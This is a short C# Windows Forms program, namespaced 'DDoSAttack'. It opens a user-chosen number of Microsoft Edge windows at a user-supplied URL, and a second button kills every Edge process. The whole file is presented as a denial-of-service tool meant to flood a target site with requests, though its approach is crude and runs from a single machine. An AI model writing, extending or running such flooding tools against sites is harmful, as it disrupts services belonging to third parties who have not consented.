using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace DDoSAttack
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            int number_of_browsers;
            Uri uriResult;
            bool result = Uri.TryCreate(textBox2.Text, UriKind.Absolute, out uriResult)
            && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);

            bool success = int.TryParse(textBox1.Text, out number_of_browsers);
            if (success)
            {
                if (result)
                {
                    for (int i = 0; i < int.Parse(textBox1.Text); i++)
                    {
                        Process P = new Process();
                        P.StartInfo.FileName = "microsoftedge.exe";
                        P.StartInfo.Arguments = textBox2.Text;
                        P.Start();
                    }
                }
                else
                {
                    textBox2.Text = "Type a valid URL";
                }
            }
            else
            {
                textBox1.Text = "Type a number and press again";
            }


        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            Process[] browsers = Process.GetProcessesByName("msedge");
            foreach (Process browser in browsers)
            {
                browser.Kill();
                browser.WaitForExit();
                browser.Dispose();
            }

        }

        private void textBox1_Click(object sender, EventArgs e)
        {
            textBox1.Text = "";
        }

        private void textBox2_Click(object sender, EventArgs e)
        {
            textBox2.Text = "";
        }

        
    }
}
